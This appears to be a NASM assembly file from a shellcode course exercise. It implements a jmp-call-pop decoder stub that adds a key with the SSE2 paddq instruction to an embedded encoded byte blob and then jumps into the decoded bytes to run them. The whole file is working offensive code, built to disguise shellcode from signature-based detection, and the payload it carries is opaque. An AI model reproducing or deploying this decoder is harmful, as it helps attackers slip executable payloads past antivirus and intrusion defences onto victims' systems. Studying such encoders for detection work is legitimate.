; File: sse2_paddq_decoder.nasm
; Author: Petr Javorik


global _start

section .text

_start:

	jmp calldecoder

decode:

	pop r9							; create data pointer
	xor rcx, rcx 					; set counter
	add cl, [r9] 					; set counter
	inc r9 							; point to first dqword
	movdqu xmm2, [r9] 				; load xmm2 with value to subtract from 2 qword packs in data
	add r9, 16						; point to next dqword
	mov r11, r9						; save pointer to the start of the shellcode

loop:

	movdqu xmm1, [r9]				; load dqword
	paddq xmm1, xmm2 				; add xmm1 and xmm2, save to xmm1
	movdqu [r9], xmm1				; overwrite dqword in data
	add r9, 16						; point to next dqword
	dec rcx 						; decrement loop counter
	jnz loop 						; repeat till rcx > 0
	jmp r11 						; execute decoded shellcode

calldecoder:

	call decode
	data: db 0x02,0x73,0xb7,0xd9,0x76,0x82,0x14,0x3c,0x03,0x73,0x62,0xdd,0x96,0x24,0x6d,0x41,0x02,0xd5,0x79,0xe6,0xd9,0xc5,0xa6,0xf3,0x5e,0xf6,0x0b,0x52,0x98,0x4e,0xfb,0x11,0x46,0x16,0x30,0x77,0xd1,0x06,0xce,0x1b,0x45,0x16,0x84,0x6b,0xec,0x9b,0xce,0xcd,0x02
